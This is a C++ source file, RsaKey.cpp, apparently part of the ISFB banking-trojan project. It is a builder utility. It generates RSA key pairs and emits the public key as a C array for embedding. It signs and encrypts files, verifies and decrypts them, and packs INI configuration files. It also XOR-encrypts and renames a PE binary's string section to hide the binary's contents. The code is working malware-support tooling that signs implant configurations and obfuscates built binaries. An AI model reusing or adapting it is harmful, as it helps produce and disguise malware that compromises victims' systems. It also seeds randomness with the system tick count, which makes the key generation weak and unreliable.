//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: RsaKey.cpp
// $Revision: 383 $
// $Date: 2014-10-23 18:31:51 +0400 (Чт, 23 окт 2014) $
// description:
//	RSA key management tool.

#pragma warning(disable:4200)	//nonstandard extension used : zero-sized array in struct/union

#include <iostream>
#include "..\common\main.h"
#include "..\common\pesup.h"
#include "..\common\cschar.h"
#include "..\common\ini.h"
#include "..\crypto\crypto.h"

#define _CRT_OUT
using namespace std;

#define		g_key	'g-'
#define		s_key	's-'
#define		v_key	'v-'
#define		u_key	'u-'
#define		h_key	'h-'
#define		c_key	'c-'
#define		i_key	'i-'


#define	szCHeader	"UCHAR g_PublicKey[] = {"
#define szCStrTmpl	"0x%02x, "
#define	szDotTxt	".txt"


// Memory allocation routines for CRYPTO library
extern "C" PVOID __stdcall	AppAlloc(ULONG Size)
{
	return(Alloc(Size));
}

extern "C" VOID __stdcall	AppFree(PVOID pMem)
{
	Free(pMem);
}

extern "C" PVOID __stdcall	AppRealloc(PVOID pMem, ULONG Size)
{
	return(Realloc(pMem, Size));
}

extern "C" ULONG __stdcall AppRand(VOID)
{
	return(GetTickCount());
}


PCHAR	BytesToCStringA(PCHAR Buffer, ULONG Size)
{
	PCHAR	String, cStr = (PCHAR)Alloc(Size * 6 + 4 + sizeof(szCHeader));
	ULONG	i;

	if (String = cStr)
	{
		strcpy(String, szCHeader);
		String += sizeof(szCHeader) - 1;

		for(i=0; i<Size; i++)
		{
			sprintf(String, szCStrTmpl, (UCHAR)Buffer[i]);
			String += 6;
		}
		String -= 2;
		String[0] = '}';
		String[1] = ';';
		String[2] = 0;
	} // if (String = cStr)

	return(cStr);
}


//
//	Encrypts the specified source buffer with the specified key.
//	Stores the ecnrypted data into the destination buffer.
//
BOOL	RsaEncryptBuffer(
	PUCHAR	Dst,		// destination buffer
	PULONG	pDstLen,	// destination buffer size in bytes
	PUCHAR	Src,		// source buffer
	ULONG	SrcLen,		// source buffer size in bytes
	PVOID	Key			// RSA key
	)
{
	BOOL Ret = FALSE;
	ULONG	bLen, Count = 40;
	ULONG	DstLen = *pDstLen;

	if (DstLen >= SrcLen)
	{
		while(SrcLen)
		{
			if (Count > SrcLen)
				Count = SrcLen;

			if (!RsaEncryptWithPrivate(Dst, &bLen, Src, Count, Key))
				break;

			ASSERT(bLen == Count);
			Dst += bLen;
			DstLen -= bLen;
			Src += Count;
			SrcLen -= Count;
		}	// while(SrcLen)

		if (SrcLen == 0)
			Ret = TRUE;
	}	// if (DstLen >= SrcLen)
	
	return(Ret);
}


//
//	Allocates a buffer and loads the specifed file into it.
//
static BOOL BlobFromFile(
	LPTSTR FileName,	// file path
	PVOID* Blob,		// receives pointer to a buffer
	ULONG* BlobLen		// receives size of the buffer in bytes
	)
{
	BOOL Ret = FALSE;
	HANDLE hFile = CreateFile(FileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		ULONG Len = GetFileSize(hFile, NULL);
		ULONG rLen = 0;
		PVOID NewBlob = (PVOID)Alloc(Len + sizeof(CHAR));
		if (NewBlob)
		{
			if (ReadFile(hFile, NewBlob, Len, &rLen, NULL))
			{
				if (Len < rLen)
					rLen = Len;
				*BlobLen = rLen;
				*Blob = NewBlob;

				// Terminating with 0
				*((PCHAR)NewBlob + rLen) = 0;

				Ret = TRUE;
			}
			else
				Free(NewBlob);
		}	// if (NewBlob)

		CloseHandle(hFile);
	}	// if (hFile != INVALID_HANDLE_VALUE)

	return(Ret);
}


//
//	Writes the pecified buffer into the specified file.
//
static BOOL BlobToFile(
	LPTSTR	FileName,	// file path
	PVOID	Blob,		// buffer
	ULONG	BlobLen		// size of the buffer in bytes
	)
{
	BOOL Ret = FALSE;
	HANDLE hFile;

	DeleteFile(FileName);
	hFile = CreateFile(FileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		ULONG Written;

		if (WriteFile(hFile, Blob, BlobLen, &Written, NULL))
			Ret = TRUE;

		CloseHandle(hFile);
	}

	return(Ret);
}


//
//	Encrypts and signs the specifed source file with the specifed key.
//	Stores encrypted data into the specified target file.
//
static BOOL SignFile(
	LPTSTR	KeyFile,	// key file path
	LPTSTR	SrcFile,	// source file path
	LPTSTR	DstFile		// target file path
	)
{
	BOOL Ret = FALSE;
	PVOID	KeyData = NULL, SrcData = NULL, DstData = NULL;
	ULONG	KeyLen, SrcLen, DstLen, Written;
	HANDLE	hFile;

	do	// Not a loop
	{
		if (!BlobFromFile(KeyFile, &KeyData, &KeyLen))
		{
			DbgPrint("Unable to read the key file, error: %x\n", GetLastError());
			cout << "Error reading the key file: " << KeyFile << endl;
			break;
		}	// if (!BlobFromFile(KeyFile, &KeyBlob, &KeyBlobLen))

		if (!BlobFromFile(SrcFile, &SrcData, &SrcLen))
		{
			cout << "Error reading the source file: " << SrcFile << endl;
			break;
		}	// if (!BlobFromFile(SrcFile, &SrcData, &SrcSize))

		if (!(DstLen = DsSign((PCHAR)SrcData, SrcLen, (PCHAR*)&DstData, (PCHAR)KeyData, TRUE, TRUE)))
		{
			cout << "Signing faild because of unknown reason." << endl;
			break;
		}

		DeleteFile(DstFile);
		hFile = CreateFile(DstFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			cout << "Error creating the destination file: " << DstFile << endl;
			break;
		}

		// Writing signed data
		Ret = WriteFile(hFile, DstData, DstLen, &Written, NULL);
		ASSERT(Written == DstLen);

		CloseHandle(hFile);
	} while(FALSE);

	if (SrcData)
		Free(SrcData);
	if (KeyData)
		Free(KeyData);
	if (DstData)
		Free(DstData);

	return(Ret);
}


//
//	Verifies if the specified source file was signed by the specifed key
//
static BOOL	VerifyFile(
	LPTSTR KeyFile,		// key file path
	LPTSTR SrcFile		// source file path
	)
{
	BOOL Ret = FALSE;
	PVOID	KeyData = NULL, SrcData = NULL, DstData = NULL;
	ULONG	KeyLen, SrcLen;

	do	// Not a loop
	{
		if (!BlobFromFile(KeyFile, &KeyData, &KeyLen))
		{
			DbgPrint("Unable to read the key file, error: %x\n", GetLastError());
			cout << "Error reading the key file: " << KeyFile << endl;
			break;
		}	// if (!BlobFromFile(KeyFile, &KeyBlob, &KeyBlobLen))

		if (!BlobFromFile(SrcFile, &SrcData, &SrcLen))
		{
			cout << "Error reading the source file: " << SrcFile << endl;
			break;
		}	// if (!BlobFromFile(SrcFile, &SrcData, &SrcSize))

		Ret = DsUnsign((PCHAR)SrcData, SrcLen, (PCHAR*)&DstData, (PCHAR)KeyData);

	} while(FALSE);

	if (KeyData)
		Free(KeyData);
	if (SrcData)
		Free(SrcData);
	if (DstData)
		Free(DstData);

	return(Ret);
}


//
//	Unsigns and decrypts the specified source file with the specified key file.
//	Stores decrypted data into the target file.
//
static BOOL UnsignFile(
	LPTSTR KeyFile,		// key file path
	LPTSTR SrcFile,		// source file path
	LPTSTR DstFile		// target file path
	)
{
	BOOL	Ret = FALSE;
	PVOID	KeyData = NULL, SrcData = NULL, DstData = NULL;
	ULONG	KeyLen, SrcLen, DstLen, Written;
	HANDLE	hFile;
	

	do	// Not a loop
	{
		if (!BlobFromFile(KeyFile, &KeyData, &KeyLen))
		{
			DbgPrint("Unable to read the key file, error: %x\n", GetLastError());
			cout << "Error reading the key file: " << KeyFile << endl;
			break;
		}	// if (!BlobFromFile(KeyFile, &KeyBlob, &KeyBlobLen))

		if (!BlobFromFile(SrcFile, &SrcData, &SrcLen))
		{
			cout << "Error reading the source file: " << SrcFile << endl;
			break;
		}	// if (!BlobFromFile(SrcFile, &SrcData, &SrcSize))


		if (!(DstLen = DsUnsign((PCHAR)SrcData, SrcLen, (PCHAR*)&DstData, (PCHAR)KeyData)))
		{
			cout << "File not signed or corrupt." << endl;
			break;
		}

		DeleteFile(DstFile);
		hFile = CreateFile(DstFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			cout << "Error creating the destination file: " << DstFile << endl;
			break;
		}

		Ret = WriteFile(hFile, DstData, DstLen, &Written, NULL);
		ASSERT(Written == DstLen);
			
		CloseHandle(hFile);
	} while(FALSE);

	if (SrcData)
		Free(SrcData);
	if (KeyData)
		Free(KeyData);
	if (DstData)
		Free(DstData);

	return(Ret);
}


LPTSTR	KeyTxtName(LPTSTR Name)
{
	LPTSTR KeyName = (LPTSTR)Alloc((strlen(Name) + 5) * sizeof(_TCHAR));
	if (KeyName)
	{
		_tcscpy(KeyName, Name);
		_tcscat(KeyName, szDotTxt);
	}
	return(KeyName);
}

//
//	Generates a pair of RSA keys (private and public)
//
static BOOL GenerateKeys(
	LPTSTR Public,		// Path to a file to store the public key in
	LPTSTR Private		// Path to a file to store the private key in
	)
{
	BOOL Ret = FALSE;
	PVOID PublicKeyBlob = NULL;
	ULONG PublicBlobLen = 0;
	PVOID PrivateKeyBlob = NULL;
	ULONG PrivateBlobLen = 0;
	PCHAR	PublicKeyString = NULL;
	PCHAR	PrivatekeyString = NULL;

	do	// not a loop
	{
		if (!RsaGenerateKeys(&PublicKeyBlob, &PublicBlobLen, &PrivateKeyBlob, &PrivateBlobLen))
		{
			DbgPrint("Key generation failed, error: %x\n", GetLastError());
			break;
		}

		if (!(PublicKeyString = BytesToCStringA((PCHAR)PublicKeyBlob, PublicBlobLen)))
		{
			cout << "Not enough memory: " << endl;
			break;
		}
			

		if (!BlobToFile(Public, PublicKeyBlob, PublicBlobLen))
		{
			DbgPrint("Unable to write a public key, error: %x\n", GetLastError());
			cout << "Error writing the public key file: " << endl;
			break;
		}

		if (!BlobToFile(KeyTxtName(Public), PublicKeyString, strlen(PublicKeyString)))
		{
			DbgPrint("Unable to write a public key, error: %x\n", GetLastError());
			cout << "Error writing the public key file: " << endl;
			break;
		}


		if (!(PrivatekeyString = BytesToCStringA((PCHAR)PrivateKeyBlob, PrivateBlobLen)))
		{
			cout << "Not enough memory: " << endl;
			break;
		}

		if (!BlobToFile(Private, PrivateKeyBlob, PrivateBlobLen))
		{
			DbgPrint("Unable to write a private key, error: %x\n", GetLastError());
			cout << "Error writing the private key file: " << endl;
			break;
		}

		
		if (!BlobToFile(KeyTxtName(Private), PrivatekeyString, strlen(PrivatekeyString)))
		{
			DbgPrint("Unable to write a private key, error: %x\n", GetLastError());
			cout << "Error writing the private key file: " << endl;
			break;
		}

		Ret = TRUE;

	} while(FALSE);


	if (PublicKeyBlob)
		Free(PublicKeyBlob);

	if (PrivateKeyBlob)
		Free(PrivateKeyBlob);

//	if (PrivatekeyString)
//		Free(PrivatekeyString);

//	if (PublicKeyString)
//		Free(PublicKeyString);

	return(Ret);
}


BOOL EncryptStringsSection(
	LPTSTR	pFilePath,
	PCHAR	pSectionName,
	PCHAR	pNewName,
	ULONG	Key
	)
{
	BOOL bRet = FALSE;
	PCHAR	pFileData = NULL;
	ULONG	FileSize;
	SECTION_NAME SecName = {0};
	PIMAGE_SECTION_HEADER	pSection;


	do	// Not a loop
	{
		if (!BlobFromFile(pFilePath, (PVOID*)&pFileData, &FileSize))
		{
			DbgPrint("Unable to read the specified file, error: %x\n", GetLastError());
			cout << "Error reading the specified file: " << pFilePath << endl;
			break;
		}	// if (!BlobFromFile(KeyFile, &KeyBlob, &KeyBlobLen))

		if (lstrlen(pSectionName) > sizeof(SECTION_NAME))
		{
			DbgPrint("Section name size is too large. It will be truncated.\n");
		}

		lstrcpyn((LPTSTR)&SecName.Byte, pSectionName, sizeof(SECTION_NAME));

		if (!(pSection = (PIMAGE_SECTION_HEADER)PeSupFindSectionByName(pFileData, &SecName)))
		{
			DbgPrint("Unable to find the specified PE section.\n");
			cout << "Unable to find the specifid PE section within the specified file." << endl;
			break;
		}

		if (!pSection->PointerToRawData || (pSection->PointerToRawData + pSection->SizeOfRawData > FileSize))
		{
			DbgPrint("Invalid file format.\n");
			cout << "Invalid file format." << endl;
			break;
		}

		// Calculating a Key value depending on the section RVA and size
		Key ^= (pSection->VirtualAddress + pSection->SizeOfRawData);
		XorEncryptBuffer(pFileData + pSection->PointerToRawData, pSection->SizeOfRawData, Key, TRUE);

		memset(pSection->Name, 0, sizeof(SECTION_NAME));
		lstrcpyn((LPTSTR)&pSection->Name, pNewName, sizeof(SECTION_NAME));		
		
		if (bRet = BlobToFile(pFilePath, pFileData, FileSize))
		{
			DbgPrint("String container section successfully encrypted.\n");
			cout << "String container section successfully encrypted." << endl;
		}

	} while(FALSE);

	if (pFileData)
		AppFree(pFileData);

	return(bRet);
}

//
//	Calculates CRC32 and MD5 hashes of the specified name.
//
static	VOID HashObject(
	LPTSTR	Name,		// Object name. It can be a file path or just a name string.
	PULONG	pCrc32,		// Receives CRC32 hash of the name or file
	PMD5	pMd5		// Receives MD5 hash of the name of file
	)
{
	PVOID	FileData = NULL;
	ULONG	FileSize = 0;

	if (BlobFromFile(Name, &FileData, &FileSize))
	{
		cout << "Hashing the specified file: \"" << Name << "\"" << endl;

		*pCrc32 = Crc32((PCHAR)FileData, FileSize);
		BufferToMd5((PCHAR)FileData, FileSize, pMd5);

		Free(FileData);
	}
	else
	{		
		cout << "Hashing the specified string: \"" << Name << "\"" << endl;
		FileSize = _tcslen(Name);
		*pCrc32 = Crc32(Name, FileSize);
		BufferToMd5(Name, FileSize, pMd5);
	}

}

static BOOL PackIniFile(
	LPTSTR SrcFile,		// source file path
	LPTSTR DstFile		// target file path
	)
{
	BOOL	Ret = FALSE;
	PVOID	SrcData = NULL;
	ULONG	SrcLen, DstLen;
	PINI_PARAMETERS	pIniParams = NULL, pPackedParams = NULL;	

	do	// Not a loop
	{
		if (!BlobFromFile(SrcFile, &SrcData, &SrcLen))
		{
			DbgPrint("Unable to read the source INI-file, error: %x\n", GetLastError());
			cout << "Error reading the source INI-file: " << SrcFile << endl;
			break;
		}	// if (!BlobFromFile(KeyFile, &KeyBlob, &KeyBlobLen))

		if (IniParseParamFile((PCHAR)SrcData, 0, '=', &pIniParams, FALSE, TRUE, 0) != NO_ERROR)
		{
			cout << "Error parsing the source INI-file." << endl;
			break;
		}

		if (IniPackParameters(pIniParams, &pPackedParams, &DstLen) != NO_ERROR)
		{
			cout << "Error packing the source INI-file." << endl;
			break;
		}

		if (!(Ret = BlobToFile(DstFile, pPackedParams, DstLen)))
		{
			cout << "Error writing the destination file: " << DstFile << endl;
			break;
		}
	} while(FALSE);

	if (pPackedParams)
		AppFree(pPackedParams);
	if (pIniParams)
		AppFree(pIniParams);
	if (SrcData)
		AppFree(SrcData);

	return(Ret);
}

//
//	Compares current number of parameters with the required value.
//	Displays an error message in case they are not equal.
//
static LONG NumberParams(
	LONG argc,	// current number of parameters
	LONG Number	// required number of parameters
	)
{
	BOOL	Ret = TRUE;
	if (argc < Number)
	{
		cout << "Invalid number of parameters." << endl;
		Ret = FALSE;
	}
	return(Ret);
}


//
//	Displays program usage information.
//
static VOID PrintUsage(VOID)
{
	cout << "RSA keys management utility." << endl;
	cout << "USE:" << endl << endl;
	cout << "rsakey -g <private key file> <public key file>" << endl;
	cout << " generates a pair of private/public keys." << endl << endl;
	cout << "rsakey -s <key file> <source file> <target file>" << endl;
	cout << " encrypts and signs \"source file\" with sthe pecified key and stores the result" << endl;
	cout << " in the \"target file\"." << endl << endl;
	cout << "rsakey -v <key file> <target file>" << endl;
	cout << " verifies the specified \"target file\" with the specified key." << endl << endl;
	cout << "rsakey -u <key file> <source file> <target file>" << endl;
	cout << " decrypts the specified \"source file\" with the specified key and stores the" << endl;
	cout << " result in the \"target file\"." << endl << endl;
	cout << "rsakey -i <source file> <target file>" << endl;
	cout << " parses and packs the specified \"source file\" as an INI-file and stores the" << endl;
	cout << " result in the \"target file\"." << endl;
}


//
//	Our application main function. 
//	Parses command line parameters and shows usage help screen.
//
int _cdecl _tmain(
	int		argc,
	_TCHAR* argv[]
	)
{
	BOOL Ret = FALSE;

	while (argc >= 3)	// not a loop
	{
		if (*(PUSHORT)argv[1] == g_key)
		{
			if (NumberParams(argc, 4) && (Ret = GenerateKeys(argv[3], argv[2])))
				cout << "Keys were successfully generated." << endl;
			break;
		}	// if (*(PUSHORT)argv[1] == k_key)

		if (*(PUSHORT)argv[1] == s_key)
		{
			if (NumberParams(argc, 5) && (Ret = SignFile(argv[2], argv[3], argv[4])))
				cout << "File was successfully encrypted and signed." << endl;
			break;
		}	// if (*(PUSHORT)argv[1] == s_key)
		if (*(PUSHORT)argv[1] == v_key)
		{
			if (NumberParams(argc, 3))
			{
				if (VerifyFile(argv[2], argv[3]))
					cout << "File successfully passed verification." << endl;
				else
					cout << "Failed: invalid key or file not signed." << endl;
				Ret = TRUE;
			}
			break;
		}	// 	if (*(PUSHORT)argv[1] == v_key)

		if (*(PUSHORT)argv[1] == u_key)
		{
			if (NumberParams(argc, 5))
			{
				if (UnsignFile(argv[2], argv[3], argv[4]))
					cout << "File was successfully decrypted." << endl;
				else
					cout << "Failed: invalid key or file not signed." << endl;
				Ret = TRUE;
			}
			break;
		}	// if (*(PUSHORT)argv[1] == u_key)

		if (*(PUSHORT)argv[1] == h_key)
		{
			ULONG	Crc;
			MD5		Md5;
			if (NumberParams(argc, 3))
			{
				HashObject(argv[2], &Crc, &Md5);
				cout << "CRC32	= " << hex << Crc << endl;
				cout << "MD5	= " << hex << Md5.dd0 << hex << Md5.dd1 << hex << Md5.dd2 << hex << Md5.dd3 << endl;
				Ret = TRUE;
			}
			break;
		}	// if (*(PUSHORT)argv[1] == h_key)


		if (*(PUSHORT)argv[1] == c_key)
		{
			// Encrypting PE string container section
			if (NumberParams(argc, 3))
			{
#ifdef	_CS_ENCRYPT_STRINGS
				Ret = EncryptStringsSection(argv[2], CS_SECTION_NAME, CS_NEW_SECTION_NAME, CsGetKey());
#else
				cout << "String container section encryption disabled." << endl;
				Ret = TRUE;
#endif
			}
		}	// if (*(PUSHORT)argv[1] == c_key)

		if (*(PUSHORT)argv[1] == i_key)
		{
			if (NumberParams(argc, 4) && (Ret = PackIniFile(argv[2], argv[3])))
			{
				cout << "INI-file successfully packed." << endl;
			}
		}	// if (*(PUSHORT)argv[1] == i_key)


		break;
	}	// while (argc >= 4)

	if (!Ret)
		PrintUsage();

	return 0;
}
